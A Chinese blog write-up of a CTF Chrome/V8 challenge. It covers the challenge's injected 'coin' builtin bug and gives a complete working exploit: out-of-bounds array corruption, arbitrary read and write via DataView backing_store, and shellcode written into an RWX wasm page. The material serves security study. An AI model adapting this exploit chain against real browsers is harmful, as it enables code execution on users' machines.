---

layout: post

title: '数字经济-chrome-pwn 分析'

date: '2020-07-20'

header-img: "img/home-bg.jpg"

tags:
     - 浏览器 pwn  
author: 'De4dCr0w'

---

<!-- more -->

### 环境搭建

（1）运行题目中的chrome，在地址栏中输入：chrome://version，获取v8的版本为7.7.2

![image-20200720165356778](D:\github\De4dCr0w.github.io\image\2020-07-20-数字经济-chrome-pwn分析\1.png)



（2）在https://chromium.googlesource.com/v8/v8/+refs 根据v8版本号获取commit id，https://chromium.googlesource.com/v8/v8/+/refs/tags/7.7.2

![image-20200720170053192](D:\github\De4dCr0w.github.io\image\2020-07-20-数字经济-chrome-pwn分析\2.png)

（3）切换到漏洞版本，进行编译：

```c
git reset --hard 0ec93e047216979431bd6f147ab5956bb729afa2
gclient sync
git apply --ignore-space-change --ignore-whitespace ../diff.patch
tools/dev/gm.py x64.release
```



### 题目分析

题目中引入的漏洞补丁为：

```c
diff --git a/src/builtins/builtins-array.cc b/src/builtins/builtins-array.cc
index e6ab965a7e..9e5eb73c34 100644
--- a/src/builtins/builtins-array.cc
+++ b/src/builtins/builtins-array.cc
@@ -362,6 +362,36 @@ V8_WARN_UNUSED_RESULT Object GenericArrayPush(Isolate* isolate,
 }
 }  // namespace
 
+// Vulnerability is here
+// You can't use this vulnerability in Debug Build :)
+BUILTIN(ArrayCoin) {
+  uint32_t len = args.length();
+  if (len != 3) {
+     return ReadOnlyRoots(isolate).undefined_value();
+  }
+  Handle<JSReceiver> receiver;
+  ASSIGN_RETURN_FAILURE_ON_EXCEPTION(
+         isolate, receiver, Object::ToObject(isolate, args.receiver()));
+  Handle<JSArray> array = Handle<JSArray>::cast(receiver);
+  FixedDoubleArray elements = FixedDoubleArray::cast(array->elements());
+
+  Handle<Object> value;
+  Handle<Object> length;
+  ASSIGN_RETURN_FAILURE_ON_EXCEPTION(
+             isolate, length, Object::ToNumber(isolate, args.at<Object>(1)));
+  ASSIGN_RETURN_FAILURE_ON_EXCEPTION(
+             isolate, value, Object::ToNumber(isolate, args.at<Object>(2)));
+
+  uint32_t array_length = static_cast<uint32_t>(array->length().Number());
+  if(37 < array_length){
+    elements.set(37, value->Number());
+    return ReadOnlyRoots(isolate).undefined_value();  
+  }
+  else{
+    return ReadOnlyRoots(isolate).undefined_value();
+  }
+}
+
 BUILTIN(ArrayPush) {
   HandleScope scope(isolate);
   Handle<Object> receiver = args.receiver();
diff --git a/src/builtins/builtins-definitions.h b/src/builtins/builtins-definitions.h
index 3412edb89d..1837771098 100644
--- a/src/builtins/builtins-definitions.h
+++ b/src/builtins/builtins-definitions.h
@@ -367,6 +367,7 @@ namespace internal {
   TFJ(ArrayPrototypeFlat, SharedFunctionInfo::kDontAdaptArgumentsSentinel)     \
   /* https://tc39.github.io/proposal-flatMap/#sec-Array.prototype.flatMap */   \
   TFJ(ArrayPrototypeFlatMap, SharedFunctionInfo::kDontAdaptArgumentsSentinel)  \
+  CPP(ArrayCoin)                                   \
                                                                                \
   /* ArrayBuffer */                                                            \
   /* ES #sec-arraybuffer-constructor */                                        \
diff --git a/src/compiler/typer.cc b/src/compiler/typer.cc
index f5fa8f19fe..03a7b601aa 100644
--- a/src/compiler/typer.cc
+++ b/src/compiler/typer.cc
@@ -1701,6 +1701,8 @@ Type Typer::Visitor::JSCallTyper(Type fun, Typer* t) {
       return Type::Receiver();
     case Builtins::kArrayUnshift:
       return t->cache_->kPositiveSafeInteger;
+    case Builtins::kArrayCoin:
+      return Type::Receiver();
 
     // ArrayBuffer functions.
     case Builtins::kArrayBufferIsView:
diff --git a/src/init/bootstrapper.cc b/src/init/bootstrapper.cc
index e7542dcd6b..059b54731b 100644
--- a/src/init/bootstrapper.cc
+++ b/src/init/bootstrapper.cc
@@ -1663,6 +1663,8 @@ void Genesis::InitializeGlobal(Handle<JSGlobalObject> global_object,
                           false);
     SimpleInstallFunction(isolate_, proto, "copyWithin",
                           Builtins::kArrayPrototypeCopyWithin, 2, false);
+	SimpleInstallFunction(isolate_, proto, "coin",
+				Builtins::kArrayCoin, 2, false);
     SimpleInstallFunction(isolate_, proto, "fill",
                           Builtins::kArrayPrototypeFill, 1, false);
     SimpleInstallFunction(isolate_, proto, "find",
```

引入的漏洞补丁增加了一个coin函数，该函数先检查参数是否为3个，如果不是就返回undefined，之后通过Object::ToNumber 获取参数length 以及value ；检查数组array 的length ，当array 长度大于37时，将参数value 赋值给array[37] ；否则直接返回undefined。

该题目漏洞在于如果传入参数value是一个对象时，v8会尝试将对象转化成数字而对回调函数valueOf或toString进行调用。过程和顺序如下图所示：

![img](D:\github\De4dCr0w.github.io\image\2020-07-20-数字经济-chrome-pwn分析\webp)

### 利用过程

（1）我们可以通过以下方式，在运行过程中修改array 数组的length：

```javascript
// poc.js
var val= {
	valueOf:function(){
	array.length = 0x100;
	return 1024;
	}
}
var array = new Array(30);
float_array=[1.1, 2.2];
array.coin(34,val);
console.log("[+] float_victim(OOBARR) array length is changed to:"+float_victim.length);
```

上述代码先分配了长度为30的数组array，之后触发调用valueOf，修改array的长度为0x100，此时element指针并未改变，造成了越界写。计算好偏移，令array[37] 正好覆盖到float_array数组的length，就可以对float_array数组进行越界读写，将内存中的数据（包括地址）当成float类型进行读取。

float_array数组的length已经被修改成了1083179008：

![image-20200721170836619](D:\github\De4dCr0w.github.io\image\2020-07-20-数字经济-chrome-pwn分析\4.png)

现在已经可以对float_array数组这一大块内存进行任意读写了。

（2）查找保存wasm代码内存页地址的指针

首先我们打算通过将shellcode写入wasm的代码段中，因为wasm 所对应的代码段的属性为rwx，在调用wasm函数时就会触发shellcode。通过查找Function–>shared_info–>WasmExportedFunctionData–>instance，在instance+0x88的偏移处，保存着wasm代码的内存页起始地址。最后可以计算出保存wasm代码内存页地址和JSFunction 对象的地址相差0x170。

```c

pwndbg> job 0x022951ba1529
0x22951ba1529: [Function] in OldSpace
 - map: 0x0a79bb2045a9 <Map(HOLEY_ELEMENTS)> [FastProperties]
 - prototype: 0x022951b82109 <JSFunction (sfi = 0xd3d08583b51)>
 - elements: 0x189327040c21 <FixedArray[0]> [HOLEY_ELEMENTS]
 - function prototype: <no-prototype-slot>
 - shared_info: 0x022951ba14f1 <SharedFunctionInfo 0>  <------------------shared_info
 - name: 0x189327044781 <String[#1]: 0>
 - formal_parameter_count: 0
 - kind: NormalFunction
 - context: 0x022951b81851 <NativeContext[249]>
 - code: 0x09aa45c42001 <Code JS_TO_WASM_FUNCTION>
 - WASM instance 0x22951ba1331
 - WASM function index 0
 - properties: 0x189327040c21 <FixedArray[0]> {
    #length: 0x0d3d085804b9 <AccessorInfo> (const accessor descriptor)
    #name: 0x0d3d08580449 <AccessorInfo> (const accessor descriptor)
    #arguments: 0x0d3d08580369 <AccessorInfo> (const accessor descriptor)
    #caller: 0x0d3d085803d9 <AccessorInfo> (const accessor descriptor)
 }

 - feedback vector: not available
pwndbg> job 0x022951ba14f1
0x22951ba14f1: [SharedFunctionInfo] in OldSpace
 - map: 0x189327040991 <Map[56]>
 - name: 0x189327044781 <String[#1]: 0>
 - kind: NormalFunction
 - function_map_index: 146
 - formal_parameter_count: 0
 - expected_nof_properties: 0
 - language_mode: sloppy
 - data: 0x022951ba14c9 <WasmExportedFunctionData>  <-------------------WasmExportedFunctionData
 - code (from data): 0x09aa45c42001 <Code JS_TO_WASM_FUNCTION>
 - function token position: -1
 - start position: -1
 - end position: -1
 - no debug info
 - scope info: 0x189327040c11 <ScopeInfo[0]>
 - length: 0
 - feedback_metadata: 0x189327042529: [FeedbackMetadata] in ReadOnlySpace
 - map: 0x1893270412c9 <Map>
 - slot_count: 0

pwndbg> job 0x022951ba14c9 
0x22951ba14c9: [WasmExportedFunctionData] in OldSpace
 - map: 0x189327045659 <Map[40]>
 - wrapper_code: 0x09aa45c42001 <Code JS_TO_WASM_FUNCTION>
 - instance: 0x022951ba1331 <Instance map = 0xa79bb209239> <---------------------instance
 - jump_table_offset: 0
 - function_index: 0
pwndbg> x/10gx 0x022951ba1330+0x88
0x22951ba13b8:	0x0000339f5e9d6000	0x000027a53898d861
0x22951ba13c8:	0x000027a53898dad1	0x0000022951b81851
0x22951ba13d8:	0x0000022951ba1459	0x00001893270404d1
0x22951ba13e8:	0x00001893270404d1	0x00001893270404d1
0x22951ba13f8:	0x00001893270404d1	0x000027a53898da51
pwndbg> telescope 0x022951ba1330+0x88
00:0000│   0x22951ba13b8 —▸ 0x339f5e9d6000 ◂— jmp    0x339f5e9d62c0 /* 0x441f0f000002bbe9 */
01:0008│   0x22951ba13c0 —▸ 0x27a53898d861 ◂— 0x2100000a79bb208c
02:0010│   0x22951ba13c8 —▸ 0x27a53898dad1 ◂— 0x2100000a79bb20a8
03:0018│   0x22951ba13d0 —▸ 0x22951b81851 ◂— 0x189327040f
04:0020│   0x22951ba13d8 —▸ 0x22951ba1459 ◂— 0x2100000a79bb209c
05:0028│   0x22951ba13e0 —▸ 0x1893270404d1 ◂— 0x1893270405
... ↓
pwndbg> vmmap 0x339f5e9d6000 
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
    0x339f5e9d6000     0x339f5e9d7000 rwxp     1000 0      
pwndbg> p/x 0x022951ba1529-0x22951ba13b8
$2 = 0x171
```

所以定义完wasm_function后，通过定义一个mask标志来遍历查找wasm_function 对象的地址，进而获得保存wasm 代码内存页地址的指针。

```javascript
var wasmCode = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);

var wasmModule = new WebAssembly.Module(wasmCode);
var wasmInstance = new WebAssembly.Instance(wasmModule, {});
var wasm_function = wasmInstance.exports.main;

var obj = {mark: 1111222233334444, obj: wasm_function};
var float_obj_idx = 0;
for(let i=0; i < 0x400; i++)
{
	if(f2i(float_array[i]) == 0x430f9534b3e01560n){
		float_obj_idx = i + 1;
		console.log("[+] find wasm_function obj : 0x" + hex(f2i(float_array[float_obj_idx])));
		break;
	}
}
var wasm_code_addr = f2i(float_array[float_obj_idx]) - 0x171n;
console.log("[+] wasm_code_addr: 0x"+hex(wasm_code_addr));
```

上述已经得到保存wasm 代码段地址的指针，接下来要构造任意读和任意写，读取该指针的内容，获取wasm 代码段的地址，并将shellcode写入wasm 代码段。

（3）通过覆盖data_buf 对象的backing_store 指针构造任意读和任意写

首先查找data_buf 对象的backing_store 指针位置，然后通过修改data_buf 对象的backing_store 指针，利用data_view.getFloat64和data_view.setUint8来实现任意读和任意写。

```javascript
var data_buf = new ArrayBuffer(0x200);
var data_view = new DataView(data_buf);
var float_buffer_idx = 0;
for(let i=0; i < 0x1000; i++)
{
	if(f2i(float_array[i]) == 0x200n){
		float_buffer_idx = i + 1;
		console.log("[+] find data_buf backing_store : 0x" + hex(f2i(float_array[float_buffer_idx])));
		break;
	}
}
function dataview_read64(addr)
{
	float_array[float_buffer_idx] = i2f(addr);
	return f2i(data_view.getFloat64(0, true));
}

function dataview_write(addr, payload)
{
	float_array[float_buffer_idx] = i2f(addr);
	for(let i=0; i < payload.length; i++)
	{
		data_view.setUint8(i, payload[i]);
	}
}
```

（4）通过任意读获取wasm代码段的地址

```javascript
var wasm_code = dataview_read64(wasm_code_addr);
console.log("[+] wasm_code : 0x" + hex(wasm_code));
```

（5）将shellcode写入wasm，并调用wasm函数

```javascript
var shellcode = [72, 184, 1, 1, 1, 1, 1, 1, 1, 1, 80, 72, 184, 46, 121, 98,
96, 109, 98, 1, 1, 72, 49, 4, 36, 72, 184, 47, 117, 115, 114, 47, 98,
105, 110, 80, 72, 137, 231, 104, 59, 49, 1, 1, 129, 52, 36, 1, 1, 1, 1,
72, 184, 68, 73, 83, 80, 76, 65, 89, 61, 80, 49, 210, 82, 106, 8, 90,
72, 1, 226, 82, 72, 137, 226, 72, 184, 1, 1, 1, 1, 1, 1, 1, 1, 80, 72,
184, 121, 98, 96, 109, 98, 1, 1, 1, 72, 49, 4, 36, 49, 246, 86, 106, 8,
94, 72, 1, 230, 86, 72, 137, 230, 106, 59, 88, 15, 5];

dataview_write(wasm_code, shellcode);
wasm_function();
```



### exp代码

```javascript

var buf = new ArrayBuffer(16);
var float64 = new Float64Array(buf);
var bigUint64 = new BigUint64Array(buf);

function f2i(f)
{
	float64[0] = f;
	return bigUint64[0];
}

function i2f(i)
{
	bigUint64[0] = i;
	return float64[0];
}

function hex(i)
{
	return i.toString(16).padStart(16, "0");
}

var val = {
	valueOf:function(){
		array.length = 0x100;
		return 0x400;
	}
}

//----- modify the length of float_array to oob 
var array = new Array(30);
float_array = [1.1, 2.2];
array.coin(34, val);
console.log("[+] float_array length is : "+ float_array.length);


//-----  find wasm_code_addr 
var wasmCode = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);

var wasmModule = new WebAssembly.Module(wasmCode);
var wasmInstance = new WebAssembly.Instance(wasmModule, {});
var wasm_function = wasmInstance.exports.main;

var obj = {mark: 1111222233334444, obj: wasm_function};

var float_obj_idx = 0;
for(let i=0; i < 0x400; i++)
{
	if(f2i(float_array[i]) == 0x430f9534b3e01560n){
		float_obj_idx = i + 1;
		console.log("[+] find wasm_function obj : 0x" + hex(f2i(float_array[float_obj_idx])));
		break;
	}
}

var wasm_code_addr = f2i(float_array[float_obj_idx]) - 0x171n;
console.log("[+] wasm_code_addr: 0x"+hex(wasm_code_addr));


//------ find backing_store
var data_buf = new ArrayBuffer(0x200);
var data_view = new DataView(data_buf);
var float_buffer_idx = 0;
for(let i=0; i < 0x1000; i++)
{
	if(f2i(float_array[i]) == 0x200n){
		float_buffer_idx = i + 1;
		console.log("[+] find data_buf backing_store : 0x" + hex(f2i(float_array[float_buffer_idx])));
		break;
	}
}

//----- arbitrary read
function dataview_read64(addr)
{
	float_array[float_buffer_idx] = i2f(addr);
	return f2i(data_view.getFloat64(0, true));
}

//----- arbitrary write
function dataview_write(addr, payload)
{
	float_array[float_buffer_idx] = i2f(addr);
	for(let i=0; i < payload.length; i++)
	{
		data_view.setUint8(i, payload[i]);
	}
}

//----- get wasm_code by AAR 
var wasm_code = dataview_read64(wasm_code_addr);
console.log("[+] wasm_code : 0x" + hex(wasm_code));

//write shellcode to wasm
var shellcode = [72, 184, 1, 1, 1, 1, 1, 1, 1, 1, 80, 72, 184, 46, 121, 98,
96, 109, 98, 1, 1, 72, 49, 4, 36, 72, 184, 47, 117, 115, 114, 47, 98,
105, 110, 80, 72, 137, 231, 104, 59, 49, 1, 1, 129, 52, 36, 1, 1, 1, 1,
72, 184, 68, 73, 83, 80, 76, 65, 89, 61, 80, 49, 210, 82, 106, 8, 90,
72, 1, 226, 82, 72, 137, 226, 72, 184, 1, 1, 1, 1, 1, 1, 1, 1, 80, 72,
184, 121, 98, 96, 109, 98, 1, 1, 1, 72, 49, 4, 36, 49, 246, 86, 106, 8,
94, 72, 1, 230, 86, 72, 137, 230, 106, 59, 88, 15, 5];

dataview_write(wasm_code, shellcode);

wasm_function();

```



运行效果图：

![image-20200721162202812](D:\github\De4dCr0w.github.io\image\2020-07-20-数字经济-chrome-pwn分析\3.png)





### 参考链接

wasm 解析网站：https://wasdk.github.io/WasmFiddle/ 

[https://e3pem.github.io/2019/11/20/browser/%E6%95%B0%E5%AD%97%E7%BB%8F%E6%B5%8E%E7%BA%BF%E4%B8%8B-Browser/](https://e3pem.github.io/2019/11/20/browser/数字经济线下-Browser/)